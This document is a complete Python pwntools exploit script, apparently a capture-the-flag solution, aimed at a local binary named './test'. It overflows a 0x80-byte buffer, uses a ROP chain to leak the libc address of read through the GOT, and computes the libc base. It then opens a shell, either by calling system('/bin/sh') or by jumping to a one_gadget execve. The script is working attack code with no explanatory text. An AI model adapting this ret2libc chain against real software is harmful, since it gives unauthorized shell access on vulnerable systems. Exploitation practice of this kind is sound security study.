from pwn import *
from LibcSearcher import *
context.arch = 'amd64'

p = process('./test')
elf = ELF('./test',checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)

p.recvuntil(':')
p.sendline(str(0x100))
p.recvuntil('?')

bss = 0x601068 + 0x800
pop_rdi = 0x400823
ret = 0x40055e
one_gadget = 0x4526a 
# execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

payload = 'A'*0x80
payload += flat([bss, pop_rdi, elf.got['read'], 0x4006F3])
p.send(payload)

p.recvuntil('A'*0x80)
read_addr = u64(p.recv()[3:].ljust(8,'\x00'))
log.success('read_addr = %#x',read_addr)

def way1():
	libc = LibcSearcher('read',read_addr)
	libc_base = read_addr - libc.dump('read')
	system_addr = libc_base + libc.dump('system')
	binsh = libc_base + libc.dump('str_bin_sh')
	log.info("system_addr = %#x, binsh = %#x"%(system_addr,binsh))

	p.sendline(str(0x100))

	p.recvuntil('?')
	payload = 'A'*(0x80+8)
	payload += flat([ret, pop_rdi, binsh, system_addr,0xabcd])
	p.send(payload)
	sleep(0.1)
	p.interactive()

def way2():
	libc_base = read_addr - libc.sym['read']
	one_gadgets = libc_base + one_gadget
	log.success("one_gadget = %#x",one_gadgets)
	p.sendline(str(0x100))
	payload = 'A'*(0x80+8)
	payload += flat([ret,one_gadgets])
	p.send(payload)
	sleep(0.1)
	p.interactive()

way2()
# way1()
